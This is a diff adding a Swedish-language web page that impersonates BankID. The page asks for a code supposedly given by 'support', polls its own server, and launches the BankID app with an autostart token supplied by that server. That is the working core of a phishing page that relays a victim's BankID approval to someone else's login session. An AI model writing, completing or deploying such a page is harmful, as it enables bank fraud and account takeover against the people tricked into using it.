@@ -1,0 +1,56 @@
+<!doctype html>
+<html lang="sv"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>BankID</title>
+<style>
+body{margin:0;font-family:-apple-system,Roboto,Arial,sans-serif;background:#eef1f4;color:#12212e;
+     display:flex;align-items:center;justify-content:center;min-height:100vh}
+#box{background:#fff;border-radius:14px;padding:26px 20px;width:88%;max-width:380px;
+     box-shadow:0 8px 28px rgba(0,0,0,.12);text-align:center}
+input{font-size:26px;letter-spacing:6px;text-align:center;width:80%;padding:10px;
+      border:2px solid #cbd5e0;border-radius:10px;text-transform:uppercase;margin:10px 0}
+button{font-size:17px;padding:12px 22px;border:0;border-radius:10px;background:#0b5cab;color:#fff;width:80%}
+.fel{background:#fed7d7;color:#822727;border-radius:8px;padding:10px;font-size:14px;margin-bottom:10px}
+.spinner{width:44px;height:44px;border:4px solid #cbd5e0;border-top-color:#0b5cab;
+         border-radius:50%;margin:14px auto;animation:sn 1s linear infinite}
+@keyframes sn{to{transform:rotate(360deg)}}
+</style></head>
+<body><div id="box">
+  <h1>BankID</h1>
+  <div id="fel" class="fel" style="display:none"></div>
+  <div id="start">
+    <p>Skriv koden du fick av supporten:</p>
+    <input id="kod" maxlength="5" autocapitalize="characters" placeholder="XXXXX">
+    <button id="ok">FORTSATT</button>
+  </div>
+  <div id="vanta" style="display:none"><div class="spinner"></div><p id="txt">Vantar...</p></div>
+</div>
+<script>
+var S={code:'',oppnad:false};
+function q(n){return new URLSearchParams(location.search).get(n);}
+function visa(id){['start','vanta'].forEach(function(x){document.getElementById(x).style.display=(x===id?'block':'none');});}
+function fel(t){var e=document.getElementById('fel');e.textContent=t;e.style.display='block';}
+async function varva(){
+  try{
+    var r=await fetch('/api/poll?code='+encodeURIComponent(S.code)+'&t='+Date.now());
+    if(!r.ok){fel('Sessionen finns inte langre.');}
+    else{
+      var d=await r.json();
+      if(d.inloggad)document.getElementById('txt').textContent='Klart! Du kan lagga ner.';
+      else if(d.token&&!S.oppnad){
+        S.oppnad=true;
+        document.getElementById('txt').textContent='Oppnar BankID...';
+        location.href='bankid:///?autostarttoken='+encodeURIComponent(d.token)+'&redirect=null';
+      }
+    }
+  }catch(e){fel('Tappade kontakten med servern.');}
+  setTimeout(varva,1500);
+}
+document.getElementById('ok').onclick=function(){
+  var k=(document.getElementById('kod').value||'').toUpperCase().replace(/[^A-Z0-9]/g,'');
+  if(k.length<4){fel('Koden ar for kort.');return;}
+  S.code=k;visa('vanta');varva();
+};
+(function(){var k=(q('code')||'').toUpperCase();if(k){document.getElementById('kod').value=k;S.code=k;visa('vanta');varva();}})();
+</script>
+</body></html>
